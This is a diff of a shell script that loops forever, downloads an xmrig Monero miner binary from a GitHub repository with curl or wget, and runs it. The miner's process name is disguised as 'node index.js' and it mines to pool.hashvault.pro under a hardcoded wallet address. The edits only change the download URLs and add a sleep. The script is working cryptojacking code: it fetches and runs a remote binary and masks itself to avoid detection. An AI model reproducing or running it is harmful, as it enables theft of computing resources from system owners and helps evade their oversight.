@@ -31,12 +31,12 @@ while true; do
 
     rm -f xmrig_$arch
     if command -v curl >/dev/null 2>&1; then
-        curl -LO https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
+        curl -LO https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
     elif command -v wget >/dev/null 2>&1; then
-        wget https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
+        wget https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
     else
-        curl -LO https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
-        wget https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
+        curl -LO https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
+        wget https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
     fi
 
 
@@ -46,4 +46,5 @@ while true; do
     else
         bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
     fi
+    sleep 30
 done
